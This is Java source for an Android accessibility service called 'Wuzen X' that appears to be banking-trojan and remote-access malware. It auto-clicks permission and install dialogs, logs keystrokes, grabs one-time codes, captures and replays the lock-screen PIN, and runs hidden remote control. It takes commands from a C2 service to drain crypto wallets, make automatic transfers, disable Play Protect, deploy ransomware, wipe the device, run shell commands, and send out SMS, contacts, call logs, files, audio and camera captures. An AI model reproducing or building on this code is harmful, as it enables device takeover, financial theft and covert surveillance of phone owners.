package com.wuzenx.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.wuzenx.C2Service;
import com.wuzenx.engine.*;
import com.wuzenx.utils.KeyguardWatcher;
import org.json.JSONObject;

public class WuzenAccessibilityService extends AccessibilityService {
    public static WuzenAccessibilityService instance = null;
    
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean keylog = false;
    private boolean otp = true;
    private String lastText = "";
    
    // Engines
    public HvncEngine hvnc;
    public AutoTransfer autoTransfer;
    public WalletDrainer walletDrainer;
    public PlayProtectDisabler ppDisabler;
    public BiometricBypass biometricBypass;
    public KeyguardWatcher keyguard;
    public CameraEngine cameraEngine;
    public AudioEngine audioEngine;
    public LocationEngine locationEngine;
    public RansomwareEngine ransomwareEngine;
    public WipeEngine wipeEngine;

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        
        // Configure accessibility service
        AccessibilityServiceInfo info = getServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags |= AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                      AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                      AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                      AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE |
                      AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS;
        info.notificationTimeout = 0;
        setServiceInfo(info);
        
        // Initialize engines
        hvnc = new HvncEngine(this, C2Service.instance);
        autoTransfer = new AutoTransfer(C2Service.instance);
        walletDrainer = new WalletDrainer(C2Service.instance);
        ppDisabler = new PlayProtectDisabler(C2Service.instance);
        biometricBypass = new BiometricBypass(this, C2Service.instance);
        keyguard = new KeyguardWatcher(C2Service.instance);
        cameraEngine = new CameraEngine(this, C2Service.instance);
        audioEngine = new AudioEngine(this, C2Service.instance);
        locationEngine = new LocationEngine(this, C2Service.instance);
        ransomwareEngine = new RansomwareEngine(this, C2Service.instance);
        wipeEngine = new WipeEngine(this);
        
        if (C2Service.instance != null) {
            C2Service.instance.sendMessage("log", "Wuzen X engine initialized");
        }
        
        // Auto-allow permissions
        handler.postDelayed(() -> autoAllow(), 300);
        handler.postDelayed(() -> autoAllow(), 1000);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    if (keylog && event.getText() != null && !event.getText().isEmpty()) {
                        String text = event.getText().toString();
                        if (!text.equals(lastText) && text.length() > lastText.length()) {
                            String newChars = text.substring(lastText.length());
                            if (C2Service.instance != null) {
                                C2Service.instance.sendMessage("keylog", newChars);
                            }
                            lastText = text;
                        }
                    }
                    keyguard.onAccessibilityEvent(event);
                    break;
                    
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    lastText = "";
                    String pkg = event.getPackageName() != null ? 
                        event.getPackageName().toString() : "";
                    
                    // Auto-allow on permission dialogs
                    if (pkg.contains("packageinstaller") || 
                        pkg.contains("permissioncontroller") ||
                        pkg.contains("settings") ||
                        pkg.contains("com.android")) {
                        handler.postDelayed(() -> autoAllow(), 200);
                    }
                    
                    keyguard.onAccessibilityEvent(event);
                    break;
                    
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    autoAllow();
                    break;
            }
        } catch (Exception ignored) {}
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        instance = null;
        if (hvnc != null) hvnc.stop();
        super.onDestroy();
    }

    private void autoAllow() {
        handler.postDelayed(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;
                
                String[] targets = {"allow", "grant", "permit", "yes", "continue", 
                                   "install", "next", "ok", "agree", "enable", 
                                   "while using", "allow all", "turn on"};
                
                findAndClick(root, targets);
                root.recycle();
            } catch (Exception ignored) {}
        }, 150);
    }

    private boolean findAndClick(AccessibilityNodeInfo node, String[] texts) {
        if (node == null) return false;
        
        CharSequence nodeText = node.getText();
        CharSequence contentDesc = node.getContentDescription();
        String viewId = node.getViewIdResourceName();
        
        if (nodeText != null || contentDesc != null) {
            String t = (nodeText != null ? nodeText.toString().toLowerCase() : "");
            String d = (contentDesc != null ? contentDesc.toString().toLowerCase() : "");
            String v = (viewId != null ? viewId.toLowerCase() : "");
            
            for (String target : texts) {
                if (t.contains(target) || d.contains(target) || v.contains(target)) {
                    if (node.isClickable()) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return true;
                    }
                }
            }
        }
        
        for (int i = 0; i < node.getChildCount(); i++) {
            try {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (findAndClick(child, texts)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            } catch (Exception ignored) {}
        }
        
        return false;
    }

    public void handleCommand(JSONObject cmd) {
        try {
            String type = cmd.optString("type", "");
            
            switch (type) {
                case "keylog":
                    keylog = cmd.optBoolean("data", !keylog);
                    if (C2Service.instance != null)
                        C2Service.instance.sendMessage("log", "Keylogger: " + (keylog ? "ON" : "OFF"));
                    break;
                    
                case "otp":
                    otp = cmd.optBoolean("data", !otp);
                    if (C2Service.instance != null)
                        C2Service.instance.sendMessage("log", "OTP grabber: " + (otp ? "ON" : "OFF"));
                    break;
                    
                case "screenshot":
                    if (hvnc != null) hvnc.captureScreen();
                    break;
                    
                case "hvnc_start":
                    if (hvnc != null) hvnc.start();
                    break;
                    
                case "hvnc_stop":
                    if (hvnc != null) hvnc.stop();
                    break;
                    
                case "hvnc": {
                    if (hvnc != null) {
                        String action = cmd.optString("action", "");
                        switch (action) {
                            case "touch":
                                hvnc.injectTouch((float) cmd.optDouble("x", 50), 
                                                (float) cmd.optDouble("y", 50));
                                break;
                            case "swipe":
                                hvnc.injectSwipe(
                                    (float) cmd.optDouble("x1", 50),
                                    (float) cmd.optDouble("y1", 50),
                                    (float) cmd.optDouble("x2", 50),
                                    (float) cmd.optDouble("y2", 50));
                                break;
                            case "text":
                                hvnc.typeText(cmd.optString("text", ""));
                                break;
                            case "backspace":
                                hvnc.pressBackspace();
                                break;
                            case "enter":
                                hvnc.pressEnter();
                                break;
                            default:
                                hvnc.performAction(action);
                                break;
                        }
                    }
                    break;
                }
                    
                case "disable_play_protect":
                    if (ppDisabler != null) ppDisabler.start();
                    break;
                    
                case "biometric_bypass":
                    if (biometricBypass != null) biometricBypass.start();
                    break;
                    
                case "unlock":
                    unlockDevice();
                    break;
                    
                case "lock":
                    lockDevice();
                    break;
                    
                case "info":
                    sendDeviceInfo();
                    break;
                    
                case "location":
                    if (locationEngine != null) locationEngine.getLocation();
                    break;
                    
                case "battery":
                    sendBatteryInfo();
                    break;
                    
                case "balance":
                case "wallets":
                case "seed":
                    if (walletDrainer != null) walletDrainer.start();
                    break;
                    
                case "clipboard":
                    if (C2Service.instance != null)
                        C2Service.instance.sendMessage("log", "Clipboard check triggered");
                    break;
                    
                case "files":
                    listFiles();
                    break;
                    
                case "contacts":
                    readContacts();
                    break;
                    
                case "network":
                    getNetworkInfo();
                    break;
                    
                case "shell":
                    String shellCmd = cmd.optString("command", "");
                    if (!shellCmd.isEmpty()) executeShell(shellCmd);
                    break;
                    
                case "record_audio":
                    int audioDuration = cmd.optInt("duration", 10);
                    if (audioEngine != null) audioEngine.startRecording(audioDuration);
                    break;
                    
                case "record_camera":
                    int camDuration = cmd.optInt("duration", 10);
                    if (cameraEngine != null) cameraEngine.capturePhoto();
                    break;
                    
                case "sms_list":
                    readSms();
                    break;
                    
                case "call_log":
                    readCallLog();
                    break;
                    
                case "apps":
                    listApps();
                    break;
                    
                case "mute":
                    setVolume(0);
                    break;
                    
                case "max_volume":
                    setVolume(100);
                    break;
                    
                case "vibrate":
                    long duration = cmd.optLong("duration", 3000);
                    vibrate(duration);
                    break;
                    
                case "flashlight":
                    toggleFlashlight();
                    break;
                    
                case "open_url":
                    String url = cmd.optString("url", "https://google.com");
                    openUrl(url);
                    break;
                    
                case "notification":
                    String title = cmd.optString("title", "System Update");
                    String text = cmd.optString("text", "");
                    sendNotification(title, text);
                    break;
                    
                case "wipe":
                    if (wipeEngine != null) wipeEngine.wipe();
                    break;
                    
                case "reboot":
                    reboot();
                    break;
                    
                case "drain_wallet":
                    String addr = cmd.optString("address", "");
                    if (walletDrainer != null && !addr.isEmpty())
                        walletDrainer.drainWallet(addr);
                    break;
                    
                case "auto_transfer":
                    String target = cmd.optString("target", "");
                    String address = cmd.optString("address", "");
                    String amount = cmd.optString("amount", "0");
                    if (autoTransfer != null && !target.isEmpty() && !address.isEmpty())
                        autoTransfer.start(new AutoTransfer.Config(target, address, amount));
                    break;
                    
                case "contacts":
                    readContacts();
                    break;
                    
                default:
                    if (C2Service.instance != null)
                        C2Service.instance.sendMessage("log", "Unknown command: " + type);
                    break;
            }
        } catch (Exception e) {
            if (C2Service.instance != null)
                C2Service.instance.sendMessage("log", "Cmd error: " + e.getMessage());
        }
    }

    private void unlockDevice() {
        String pin = keyguard.getCapturedPin();
        if (!pin.isEmpty()) {
            for (char c : pin.toCharArray()) {
                hvnc.typeText(String.valueOf(c));
            }
            hvnc.pressEnter();
            if (C2Service.instance != null)
                C2Service.instance.sendMessage("log", "Auto-unlock with PIN: " + pin);
        } else {
            performGlobalAction(GLOBAL_ACTION_HOME);
        }
    }

    private void lockDevice() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) 
                getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName cn = new ComponentName(this, AdminReceiver.class);
            if (dpm.isAdminActive(cn)) {
                dpm.lockNow();
            } else {
                performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
            }
        } catch (Exception e) {
            performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
        }
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("model", Build.MODEL);
            info.put("brand", Build.BRAND);
            info.put("android", Build.VERSION.RELEASE);
            info.put("sdk", Build.VERSION.SDK_INT);
            info.put("device", Build.DEVICE);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("product", Build.PRODUCT);
            info.put("fingerprint", Build.FINGERPRINT);
            info.put("battery", getBatteryLevel());
            info.put("uptime", System.currentTimeMillis());
            
            if (C2Service.instance != null)
                C2Service.instance.sendMessage("log", info.toString());
        } catch (Exception ignored) {}
    }

    private void sendBatteryInfo() {
        int level = getBatteryLevel();
        if (C2Service.instance != null)
            C2Service.instance.sendMessage("log", "Battery: " + level + "%");
    }

    private int getBatteryLevel() {
        try {
            Intent i = registerReceiver(null, new Intent(Intent.ACTION_BATTERY_CHANGED));
            if (i == null) return -1;
            int level = i.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
            int scale = i.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
            if (level >= 0 && scale > 0) return level * 100 / scale;
        } catch (Exception ignored) {}
        return -1;
    }

    private void listFiles() {
        try {
            java.io.File root = new java.io.File("/storage/emulated/0");
            StringBuilder sb = new StringBuilder();
            sb.append("Files:\n");
            if (root.exists()) {
                java.io.File[] files = root.listFiles();
                if (files != null) {
                    for (java.io.File f : files) {
                        sb.append(f.getName()).append(f.isDirectory() ? "/" : "")
                          .append(" (").append(f.length()).append(")\n");
                    }
                }
            }
            if (C2Service.instance != null)
                C2Service.instance.sendMessage("log", sb.toString());
        } catch (Exception ignored) {}
    }

    private void readContacts() {
        try {
            StringBuilder sb = new StringBuilder("Contacts:\n");
            android.database.Cursor cursor = getContentResolver().query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
            
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 50) {
                    String name = cursor.getString(cursor.getColumnIndex(
                        android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(
                        android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append(name).append(": ").append(number).append("\n");
                    count++;
                }
                cursor.close();
            }
            
            if (C2Service.instance != null)
                C2Service.instance.sendMessage("contacts", sb.toString());
        } catch (Exception ignored) {}
    }

    private void getNetworkInfo() {
        try {
            android.net.ConnectivityManager cm = (android.net.ConnectivityManager)
                getSystemService(Context.CONNECTIVITY_SERVICE);
            android.net.NetworkInfo info = cm.getActiveNetworkInfo();
            
            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager)
                getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            
            StringBuilder sb = new StringBuilder();
            sb.append("Network:\n");
            if (info != null && info.isConnected()) {
                sb.append("Type: ").append(info.getTypeName()).append("\n");
                if (wm != null && wm.getConnectionInfo() != null) {
                    sb.append("SSID: ").append(wm.getConnectionInfo().getSSID()).append("\n");
                    sb.append("IP: ").append(android.text.format.Formatter
                        .formatIpAddress(wm.getConnectionInfo().getIpAddress())).append("\n");
                }
            }
            
            if (C2Service.instance != null)
                C2Service.instance.sendMessage("log", sb.toString());
        } catch (Exception ignored) {}
    }

    private void readSms() {
        try {
            StringBuilder sb = new StringBuilder("SMS:\n");
            android.database.Cursor cursor = getContentResolver().query(
                android.net.Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC LIMIT 20");
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    sb.append(address).append(": ").append(body).append("\n---\n");
                }
                cursor.close();
            }
            
            if (C2Service.instance != null)
                C2Service.instance.sendMessage("log", sb.toString());
        } catch (Exception ignored) {}
    }

    private void readCallLog() {
        try {
            StringBuilder sb = new StringBuilder("Call Log:\n");
            android.database.Cursor cursor = getContentResolver().query(
                android.provider.CallLog.Calls.CONTENT_URI,
                null, null, null, 
                android.provider.CallLog.Calls.DATE + " DESC LIMIT 20");
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex(
                        android.provider.CallLog.Calls.NUMBER));
                    String type = cursor.getString(cursor.getColumnIndex(
                        android.provider.CallLog.Calls.TYPE));
                    String duration = cursor.getString(cursor.getColumnIndex(
                        android.provider.CallLog.Calls.DURATION));
                    sb.append(number).append(" (").append(type).append(") ")
                      .append(duration).append("s\n");
                }
                cursor.close();
            }
            
            if (C2Service.instance != null)
                C2Service.instance.sendMessage("log", sb.toString());
        } catch (Exception ignored) {}
    }

    private void listApps() {
        try {
            StringBuilder sb = new StringBuilder("Apps:\n");
            android.content.pm.PackageManager pm = getPackageManager();
            java.util.List<android.content.pm.PackageInfo> packages = 
                pm.getInstalledPackages(0);
            
            int count = 0;
            for (android.content.pm.PackageInfo p : packages) {
                if (count >= 30) break;
                sb.append(p.applicationInfo.loadLabel(pm))
                  .append(" (").append(p.packageName).append(")\n");
                count++;
            }
            
            if (C2Service.instance != null)
                C2Service.instance.sendMessage("log", sb.toString());
        } catch (Exception ignored) {}
    }

    private void setVolume(int percent) {
        try {
            android.media.AudioManager am = (android.media.AudioManager)
                getSystemService(Context.AUDIO_SERVICE);
            int max = am.getStreamMaxVolume(android.media.AudioManager.STREAM_MUSIC);
            int vol = percent * max / 100;
            am.setStreamVolume(android.media.AudioManager.STREAM_MUSIC, vol, 0);
            am.setStreamVolume(android.media.AudioManager.STREAM_RING, vol, 0);
            am.setStreamVolume(android.media.AudioManager.STREAM_ALARM, vol, 0);
            am.setStreamVolume(android.media.AudioManager.STREAM_NOTIFICATION, vol, 0);
            
            if (C2Service.instance != null) {
                String msg = percent == 0 ? "Muted" : "Volume set to " + percent + "%";
                C2Service.instance.sendMessage("log", msg);
            }
        } catch (Exception ignored) {}
    }

    private void vibrate(long ms) {
        try {
            android.os.Vibrator v = (android.os.Vibrator) 
                getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null && v.hasVibrator()) {
                v.vibrate(ms);
            }
        } catch (Exception ignored) {}
    }

    private void toggleFlashlight() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                android.hardware.camera2.CameraManager cm = (android.hardware.camera2.CameraManager)
                    getSystemService(Context.CAMERA_SERVICE);
                String id = cm.getCameraIdList()[0];
                cm.setTorchMode(id, true);
                handler.postDelayed(() -> {
                    try { cm.setTorchMode(id, false); } catch (Exception ignored) {}
                }, 3000);
                
                if (C2Service.instance != null)
                    C2Service.instance.sendMessage("log", "Flashlight toggled");
            }
        } catch (Exception ignored) {}
    }

    private void openUrl(String url) {
        try {
            Intent i = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
        } catch (Exception ignored) {}
    }

    private void sendNotification(String title, String text) {
        try {
            String ch = "wuzenx_cmd";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.app.NotificationChannel channel = new android.app.NotificationChannel(
                    ch, "Commands", android.app.NotificationManager.IMPORTANCE_HIGH);
                ((android.app.NotificationManager) getSystemService(NOTIFICATION_SERVICE))
                    .createNotificationChannel(channel);
            }
            
            android.app.Notification.Builder builder = new android.app.Notification.Builder(this, ch)
                .setContentTitle(title)
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setAutoCancel(true);
            
            ((android.app.NotificationManager) getSystemService(NOTIFICATION_SERVICE))
                .notify(1001, builder.build());
        } catch (Exception ignored) {}
    }

    private void executeShell(String cmd) {
        try {
            java.io.BufferedReader reader = new java.io.BufferedReader(
                new java.io.InputStreamReader(
                    Runtime.getRuntime().exec(cmd).getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line).append("\n");
            }
            reader.close();
            
            if (C2Service.instance != null)
                C2Service.instance.sendMessage("log", sb.toString());
        } catch (Exception e) {
            if (C2Service.instance != null)
                C2Service.instance.sendMessage("log", "Shell error: " + e.getMessage());
        }
    }

    private void reboot() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName cn = new ComponentName(this, AdminReceiver.class);
            if (dpm.isAdminActive(cn)) {
                dpm.reboot(cn);
            }
        } catch (Exception ignored) {
            try {
                Runtime.getRuntime().exec("su -c reboot");
            } catch (Exception ignored2) {}
        }
    }
}
